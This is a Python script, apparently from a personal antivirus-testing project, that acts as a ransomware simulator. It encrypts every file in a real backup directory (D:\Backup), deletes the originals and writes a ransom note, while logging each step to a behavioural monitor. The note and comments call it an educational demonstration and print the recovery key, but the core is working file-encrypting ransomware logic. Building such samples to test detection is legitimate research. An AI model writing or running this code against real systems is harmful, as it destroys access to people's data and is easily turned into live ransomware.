"""
REAL BACKUP DIRECTORY ENCRYPTION SCRIPT
Actually encrypts files in D:\Backup directory
Uses real Fernet encryption - files can be recovered with key
NOW WITH BEHAVIORAL MONITORING FOR ANTIVIRUS DETECTION
"""

import os
import sys
import time
from cryptography.fernet import Fernet
from pathlib import Path
# Import behavioral monitoring
from monitor.monitor import BehaviorMonitor

class BackupRealEncryptor:
    def __init__(self, target_dir):
        self.target_directory = Path(target_dir)
        self.encryption_extension = '.backup_encrypted'
        self.key = None
        self.encrypted_files = []
        # Add behavioral monitor for antivirus detection
        self.monitor = BehaviorMonitor()
        
    def generate_key(self):
        """Generate Fernet encryption key"""
        self.key = Fernet.generate_key()
        return self.key
    
    def encrypt_backup_files(self):
        """Actually encrypt all files in backup directory"""
        print('=== REAL BACKUP DIRECTORY ENCRYPTION ATTACK ===')
        print(f'Target Directory: {self.target_directory}')
        print()
        
        # Generate encryption key
        key = self.generate_key()
        print('[SECURITY] BACKUP ENCRYPTION KEY GENERATED')
        print(f'KEY: {key.decode()}')
        print('[SAVE THIS KEY FOR RECOVERY]')
        print()
        
        # Check target directory
        if not self.target_directory.exists():
            print('[ERROR] Backup directory does not exist')
            return key
            
        # Find files to encrypt
        files_to_encrypt = []
        for item in self.target_directory.iterdir():
            if item.is_file() and not item.name.endswith(self.encryption_extension):
                files_to_encrypt.append(item)
        
        if not files_to_encrypt:
            print('[WARNING] No backup files found to encrypt')
            return key
        
        print(f'[TARGET] Found {len(files_to_encrypt)} backup files to encrypt:')
        for f in files_to_encrypt:
            print(f'  - {f.name}')
        print()
        
        # Initialize Fernet cipher
        cipher = Fernet(self.key)
        
        # Encrypt files
        successful_encryptions = 0
        for i, file_path in enumerate(files_to_encrypt, 1):
            try:
                print(f'[ENCRYPTING {i}/{len(files_to_encrypt)}] {file_path.name}')
                
                # LOG: File read operation (behavioral monitoring)
                self.monitor.log_operation('ReadFile', str(file_path), {
                    'operation': 'ransomware_read',
                    'size': file_path.stat().st_size if file_path.exists() else 0
                })
                
                # Read original file
                with open(file_path, 'rb') as f:
                    original_data = f.read()
                
                # LOG: Crypto operation (behavioral monitoring)
                self.monitor.log_operation('CryptEncrypt', str(file_path), {
                    'operation': 'ransomware_encrypt',
                    'algorithm': 'Fernet-AES128',
                    'input_size': len(original_data)
                })
                
                # Encrypt data
                encrypted_data = cipher.encrypt(original_data)
                
                # Create encrypted filename
                encrypted_filename = str(file_path) + self.encryption_extension
                encrypted_path = Path(encrypted_filename)
                
                # LOG: File write operation (behavioral monitoring)
                self.monitor.log_operation('WriteFile', encrypted_filename, {
                    'operation': 'ransomware_write',
                    'size': len(encrypted_data)
                })
                
                # Write encrypted file
                with open(encrypted_path, 'wb') as f:
                    f.write(encrypted_data)
                
                # LOG: File delete operation (behavioral monitoring)
                self.monitor.log_operation('DeleteFile', str(file_path), {
                    'operation': 'ransomware_delete'
                })
                
                # Delete original file
                file_path.unlink()
                
                self.encrypted_files.append(file_path.name)
                successful_encryptions += 1
                print(f'  -> Successfully encrypted')
                
                # Small delay for visibility
                time.sleep(0.5)
                
            except Exception as e:
                print(f'  -> FAILED: {e}')
        
        # Create ransom note
        self._create_backup_ransom_note(successful_encryptions)
        
        # Summary
        print()
        print('=' * 60)
        print('REAL BACKUP DIRECTORY ENCRYPTION COMPLETED')
        print('=' * 60)
        print(f'Backup files encrypted: {successful_encryptions}/{len(files_to_encrypt)}')
        print(f'Extension used: {self.encryption_extension}')
        print(f'Recovery key: {key.decode()}')
        print(f'Behavioral log: {self.monitor.log_path}')
        print()
        print('RECOVERY COMMAND:')
        print(f'python simulators/backup_decryptor.py')
        print('(Use the key above when prompted)')
        print('=' * 60)
        
        return key
    
    def _create_backup_ransom_note(self, file_count):
        """Create backup-specific ransom note"""
        note_content = f'''===============================================
   BACKUP DIRECTORY RANSOMWARE ATTACK
===============================================

YOUR BACKUP FILES HAVE BEEN ENCRYPTED!

Files affected: {file_count}
Extension added: {self.encryption_extension}

CRITICAL INFORMATION:
- These are your BACKUP files
- They contain important data copies
- Without backups, original files may be lost forever

ENCRYPTION DETAILS:
- Algorithm: Military-grade Fernet/AES
- Key Required for Recovery: YES
- Recovery Method: Decryption tool with key

RECOVERY PROCEDURE:
1. SAVE the encryption key displayed above
2. Navigate to: C:\Users\Kanhaiya\System And Security\core_system
3. Run: python simulators/backup_decryptor.py
4. Enter the recovery key when prompted
5. Files will be restored to original state

THIS IS AN EDUCATIONAL DEMONSTRATION ONLY.
NO ACTUAL RANSOM PAYMENT REQUIRED.

===============================================
        BACKUP RECOVERY INSTRUCTIONS
===============================================
'''
        
        note_path = self.target_directory / 'BACKUP_ENCRYPTION_NOTICE.txt'
        with open(note_path, 'w') as f:
            f.write(note_content)
        print(f'[NOTE] Created backup recovery instructions: BACKUP_ENCRYPTION_NOTICE.txt')

# Run the backup encryption
if __name__ == "__main__":
    encryptor = BackupRealEncryptor(r'D:\Backup')
    recovery_key = encryptor.encrypt_backup_files()
    print(f'\nSAVE THIS BACKUP RECOVERY KEY: {recovery_key.decode()}')